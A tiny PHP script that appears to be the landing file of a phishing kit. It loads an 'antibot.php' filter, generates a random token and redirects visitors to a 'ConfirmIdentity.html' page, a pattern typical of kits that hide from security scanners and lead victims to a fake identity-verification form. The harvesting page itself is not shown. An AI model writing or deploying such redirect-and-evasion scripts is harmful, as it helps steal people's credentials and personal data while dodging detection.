<?php
include ('antibot.php');
$TKRand = md5(uniqid(rand(), true));
header("Location: ConfirmIdentity.html?id=".$TKRand);
  
?>
